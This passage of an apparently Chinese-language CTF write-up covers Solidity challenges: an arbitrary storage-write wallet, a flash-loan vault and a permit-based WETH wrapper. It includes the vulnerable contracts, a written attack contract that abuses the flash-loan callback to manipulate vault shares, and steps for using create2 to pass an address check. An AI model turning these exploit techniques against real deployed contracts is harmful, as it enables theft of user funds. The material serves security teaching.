        Wallet storage wallet = wallets[address(this)][0];
        wallet.walletName="cuit";
        wallet.uniqueTokens=1;
        wallet.balances[address(fake)]= 10 ether;
    }

    function addWallet(string memory name,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");

        wallets[msg.sender].push();
        Wallet storage wallet = wallets[msg.sender][wallets[msg.sender].length-1];
        wallet.walletName=name;
        wallet.uniqueTokens=1;
        wallet.balances[_token] = amount;
    }

    function addWalletToken(uint256 index,address _token,uint256 amount)public{
        require(IERC20(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");
        require(wallets[msg.sender].length-index>0);

        Wallet storage wallet = wallets[msg.sender][index];
        wallet.uniqueTokens++;
        wallet.balances[_token] = amount;
    }

    function getTokenBalance(address _addr,uint256 index,address _token)public view returns(uint256 amount){
        return wallets[_addr][index].balances[_token];
    }   

    function setSlot(bytes32 slot,bytes32 value)public {
        require(uint160(msg.sender)&0xff == 0x23);
        StorageSlotUpgradeable.getBytes32Slot(slot).value = value;
    }

    function isCompleted(string memory email)public{
        require(wallets[address(this)][0].balances[address(fake)]==0);
        emit SendFlag(email);
    }
    
}
			</code></pre>
			<p>题目要求:</p>
			<p>清空合约ether</p>
			<p>观察可知:</p>
			<p>setSlot函数可以改变对应槽中的数据,其require要求调用者地址的最后两位为23</p>
			<p>改变对应槽中的数据可以选择改变fake对应槽或者选择改变10个ether对应槽中的数据</p>
			<p>选择create2来计算合约地址最后两位为23,用这个地址来部署攻击合约调用setSlot()</p>
			<p>攻击合约如下:</p>
			<img src="https://yexingyu123456.github.io/photograph/exam1.png">
			<P>攻击合约中attack()中addr为wallet合约的地址,create2Factory合约中调用getaddress获取最后两位为23的地址,并获得slot</P>
			<p>deploy(slot),部署攻击合约</p>
			<p>部署完成后调出该合约,调用其中的slot函数,_slot为_value所对应的key,改变对应槽中的数据可以选择改变fake对应槽或者选择改变10个ether对应槽中的数据</p>
            <p>完成后可以查看wallet合约的getTokenBalance()查看是否清零,调用isCompleted()通过即可</p>
			<br><br><br><br><br><br><br>
			<h3>FlashLoanMain.sol</h3>
			<p>题目合约</p>
			<pre><code>
				pragma solidity ^0.8.0;

interface ICert {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IVault {
    function join(uint256 amount) external;
    function exit() external;
    function cert() external view returns(ICert);
    function transferToAccount(address account, uint256 amount) external returns(bool);
    function setPriveder(address flashLoanPriveder_) external;
}

interface IFlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface IFlashLoanMain {
    function airdrop()external;
    function Complete()external returns(bool);
}

interface IFlashLoanPriveder {
    function flashLoan(
        IFlashBorrower receiver,
        address token,
        uint256 amount,
        bytes memory signature,
        bytes calldata data
    ) external returns (bool);
}

library StringsUpgradeable {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {

        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0x00";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }
}

library ECDSAUpgradeable {
    enum RecoverError {
        NoError,
        InvalidSignature,
        InvalidSignatureLength,
        InvalidSignatureS,
        InvalidSignatureV
    }

    function _throwError(RecoverError error) private pure {
        if (error == RecoverError.NoError) {
            return; // no error: do nothing
        } else if (error == RecoverError.InvalidSignature) {
            revert("ECDSA: invalid signature");
        } else if (error == RecoverError.InvalidSignatureLength) {
            revert("ECDSA: invalid signature length");
        } else if (error == RecoverError.InvalidSignatureS) {
            revert("ECDSA: invalid signature 's' value");
        } else if (error == RecoverError.InvalidSignatureV) {
            revert("ECDSA: invalid signature 'v' value");
        }
    }
    function tryRecover(
        bytes32 hash,
        bytes32 r,
        bytes32 vs
    ) internal pure returns (address, RecoverError) {
        bytes32 s = vs & bytes32(0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);
        uint8 v = uint8((uint256(vs) >> 255) + 27);
        return tryRecover(hash, v, r, s);
    }

    function recover(
        bytes32 hash,
        bytes32 r,
        bytes32 vs
    ) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, r, vs);
        _throwError(error);
        return recovered;
    }

    function tryRecover(bytes32 hash, bytes memory signature) internal pure returns (address, RecoverError) {
        if (signature.length == 65) {
            bytes32 r;
            bytes32 s;
            uint8 v;
            assembly {
                r := mload(add(signature, 0x20))
                s := mload(add(signature, 0x40))
                v := byte(0, mload(add(signature, 0x60)))
            }
            return tryRecover(hash, v, r, s);
        } else if (signature.length == 64) {
            bytes32 r;
            bytes32 vs;
            assembly {
                r := mload(add(signature, 0x20))
                vs := mload(add(signature, 0x40))
            }
            return tryRecover(hash, r, vs);
        } else {
            return (address(0), RecoverError.InvalidSignatureLength);
        }
    }

    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, signature);
        _throwError(error);
        return recovered;
    }

    function tryRecover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal pure returns (address, RecoverError) {
        if (uint256(s) > 0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0) {
            return (address(0), RecoverError.InvalidSignatureS);
        }
        if (v != 27 && v != 28) {
            return (address(0), RecoverError.InvalidSignatureV);
        }

        address signer = ecrecover(hash, v, r, s);
        if (signer == address(0)) {
            return (address(0), RecoverError.InvalidSignature);
        }

        return (signer, RecoverError.NoError);
    }

    function recover(
        bytes32 hash,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal pure returns (address) {
        (address recovered, RecoverError error) = tryRecover(hash, v, r, s);
        _throwError(error);
        return recovered;
    }

    function toEthSignedMessageHash(bytes32 hash) internal pure returns (bytes32) {
        // 32 is the length in bytes of hash,
        // enforced by the type signature above
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
    }

    function toEthSignedMessageHash(bytes memory s) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n", StringsUpgradeable.toString(s.length), s));
    }

    function toTypedDataHash(bytes32 domainSeparator, bytes32 structHash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
    }
}

contract FlashLoanPriveder {
    IVault vault;
    bytes32 public msgHash = 0x1a6092262d7dc33c2f4b9913ad9318a8c41a138bb42dfacd4c7b6b46b8656522;
    bytes32 public r = 0xb158f1759111cd99128505f450f608c97178e2b6b9b6f7c3b0d2949e3a21cd02;
    bytes32 public s = 0x3ade8887fce9b513d41eb36180d6f7d9e072c756991034de2c9a5da541fb8184;
    uint8 public v = 0x1b;

    address public flashLoanMain;

    constructor (address vault_) {
        flashLoanMain = msg.sender;
        vault = IVault(vault_); 
    }

    function flashLoan(
        IFlashBorrower receiver,
        address token,
        uint256 amount,
        bytes memory signature,
        bytes calldata data
    ) external returns (bool){
        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));
        require(ECDSAUpgradeable.recover(msgHash,v,r,s) == ECDSAUpgradeable.recover(message, signature),"Error signer!");
        require(
            amount <= vault.cert().balanceOf(address(vault)),
            "AMOUNT_BIGGER_THAN_BALANCE"
        );
        require(vault.transferToAccount(address(receiver), amount), "FLASH_LENDER_TRANSFER_FAILED");
        require(
            receiver.onFlashLoan(msg.sender, token, amount, data) == true,
            "FLASH_LENDER_CALLBACK_FAILED"
        );
        require(
            ICert(vault.cert()).transferFrom(
                address(receiver),
                address(vault),
                amount
            ),
            "FLASH_LENDER_REPAY_FAILED"
        );
        return true;
    }

    function getMsgHash(IFlashBorrower receiver,address token,uint256 amount) public view returns(bytes32){
        bytes32 message = keccak256(abi.encodePacked(address(this), amount, receiver, token));
        return message;
    }

}


contract Cert {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public flashLoanMain;

    uint256 private _totalSupply;
    constructor()public {
        flashLoanMain = msg.sender;
    }


    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function mint(address to, uint256 amount) public {
        require(msg.sender==flashLoanMain,"Forbidden!");
        _mint(to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}


contract Vault {
    mapping(address => uint256) public balanceOf;
    ICert public cert;
    address flashLoanPriveder;
    uint256 public totalSupply;
    address public flashLoanMain;
    uint256 internal constant RATIO_MULTIPLY_FACTOR = 10**6;
    constructor (address cert_,uint amount) {
        flashLoanMain = msg.sender;
        cert = ICert(cert_);
        totalSupply += amount; 
        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();
        balanceOf[msg.sender] = receivedETokens;
    }

    function setPriveder(address flashLoanPriveder_)public {
        require(msg.sender==flashLoanMain,"setPriveder Forbidden!");
        flashLoanPriveder = flashLoanPriveder_;
    }

    function join(uint256 amount) external{
        require(amount > 0, "CANNOT_STAKE_ZERO_TOKENS");
        uint256 receivedETokens = amount *RATIO_MULTIPLY_FACTOR / getRatio();
        totalSupply += receivedETokens;
        balanceOf[msg.sender] += receivedETokens;
        require(cert.transferFrom(msg.sender, address(this), amount),"TRANSFER_STAKED_FAIL");
    }

    function exit() external {
        uint256 amount = balanceOf[msg.sender];
        uint256 stakedTokensToTransfer = amount * getRatio() / RATIO_MULTIPLY_FACTOR;
        totalSupply -= amount;
        balanceOf[msg.sender] = 0;
        require(cert.transfer(msg.sender, stakedTokensToTransfer), 'TRANSFER_STAKED_FAIL');
    }

    function getRatio() public view returns(uint256){
        if (totalSupply> 0 && cert.balanceOf(address(this)) > 0) {
            return cert.balanceOf(address(this)) *RATIO_MULTIPLY_FACTOR / totalSupply;
        }
        return 1;
    }

    function transferToAccount(address account, uint256 amount) external returns(bool){
        require(msg.sender==flashLoanPriveder,"transferToAccount Forbidden!");
        return cert.transfer(account, amount);
    }
}

contract FlashLoanMain {
    Vault public vault;
    Cert public cert;
    FlashLoanPriveder public flashLoanPriveder;
    bool public isAirdrop;
    bool public isComplete;
    event sendflag(address user);
    constructor() {
        cert = new Cert();
        vault = new Vault(address(cert),1000*10**18);
        cert.mint(address(vault),1000*10**18);
        flashLoanPriveder = new FlashLoanPriveder(address(vault));
        vault.setPriveder(address(flashLoanPriveder));
    }

    function airdrop() public {
        require(!isAirdrop,"Already get airdrop!");
        cert.mint(msg.sender,100*10**18);
        isAirdrop = true;
    }

    function Complete()public returns(bool) {
        if (cert.balanceOf(msg.sender)>100*10**18){
            isComplete = true;
            emit sendflag(msg.sender);
        }
        return isComplete;
    }
}




</code></pre>
<p>攻击合约</p>
<pre><code>
	// SPDX-License-Identifier: MIT
import "4.sol";
contract attack{
    FlashLoanPriveder  privider;
    FlashLoanMain main;
    Vault vault;
    Cert cert;

constructor(address _add1,address _add2,address _add3,address _add4) public payable{
    privider = FlashLoanPriveder(_add1);
    main = FlashLoanMain(_add2);
    vault = Vault(_add3);
    cert = Cert(_add4);
}

function doflashon(IFlashBorrower receiver,address token,uint256 amount,bytes memory signature,bytes calldata data) public{
    main.airdrop();
    privider.flashLoan(receiver,token,amount,signature,data);
    
}
function onFlashLoan(address initator,address token,uint256 amount,bytes calldata) external returns(bool){
    cert.approve(address(vault),1000);
    vault.join(1000);
    main.Complete();
    cert.approve(address(privider),amount);
    return true;
}
function withdraw() public{
    vault.exit();
    
}
function Complete() public {
    main.Complete();
}
}
</code></pre>
<p>还没完全搞懂这道题</p>
<br><br><br><br><br><br><br><br><br>
<h3>LostAssets.sol</h3>
<p>题目合约</p>
<pre><code>
	pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Permit, ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol";

contract MockWETH is ERC20("Wrapped ETH", "WETH") {
    event Deposit(address indexed dst, uint256 wad);
    event Withdrawal(address indexed src, uint256 wad);

    /// @dev Original WETH9 implements `fallback` function instead of `receive` function due to a earlier solidity version
    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        _mint(msg.sender, msg.value);
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) public {
        require(balanceOf(msg.sender) >= wad, "weth: insufficient balance");

        _burn(msg.sender, wad);
        (bool success, ) = msg.sender.call{value: wad}("");
        require(success, "weth: failed");

        emit Withdrawal(msg.sender, wad);
    }
}

/// @notice Token sWETH
contract MocksWETH is ERC20Permit {
    using SafeERC20 for IERC20;

    address underlying;

    constructor(address _underlying)
        ERC20("WrappedERC20", "WERC20")
        ERC20Permit("WrappedERC20")
    {
        underlying = _underlying;
    }

    function deposit() external returns (uint256) {
        uint256 _amount = IERC20(underlying).balanceOf(msg.sender);
        IERC20(underlying).safeTransferFrom(msg.sender, address(this), _amount);
        return _deposit(_amount, msg.sender);
    }

    function deposit(uint256 amount) external returns (uint256) {
        IERC20(underlying).safeTransferFrom(msg.sender, address(this), amount);
        return _deposit(amount, msg.sender);
    }

    function depositWithPermit(
        address target,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address to
    ) external returns (uint256) {
        // permit is an alternative to the standard approve call:
        // it allows an off-chain secure signature to be used to register an allowance.
        // The permitter is approving the beneficiary to spend their money, by signing the permit request
        IERC20Permit(underlying).permit(
            target,
            address(this),
            value,
            deadline,
            v,
            r,
            s
        );
        IERC20(underlying).safeTransferFrom(target, address(this), value);
        return _deposit(value, to);
    }

    function _deposit(uint256 value, address to) internal returns (uint256) {
        _mint(to, value);
        return value;
    }

    /// @notice withdraw all
    function withdraw() external returns (uint256) {
        return _withdraw(msg.sender, balanceOf(msg.sender), msg.sender);
    }

    /// @notice withdraw specified `amount`
    function withdraw(uint256 amount) external returns (uint256) {
        return _withdraw(msg.sender, amount, msg.sender);
    }

    function _withdraw(
        address from,
        uint256 amount,
        address to
    ) internal returns (uint256) {
        _burn(from, amount);
        IERC20(underlying).safeTransfer(to, amount);
        return amount;
    }
}

contract LostAssets {
    MockWETH public WETH;
    MocksWETH public sWETH;

    constructor() payable {
        require(msg.value >= 1 ether, "At least 1 ether");

        WETH = new MockWETH();
        sWETH = new MocksWETH(address(WETH));

        WETH.deposit{value: msg.value}();
        // Guaranteed interchangeability of WETH and sWETH
        WETH.approve(address(sWETH), type(uint256).max);
        // sWETH.approve(address(WETH), type(uint256).max); // WETH cannot use approval
        // Deposit half of weth balance
        sWETH.deposit(msg.value / 2);
    }

    function isComplete() public view returns (bool) {
        require(WETH.balanceOf(address(this)) == 0);
        return true;
    }
}
<p>根据题目:</p>
</code></pre>
  </body>
</html>
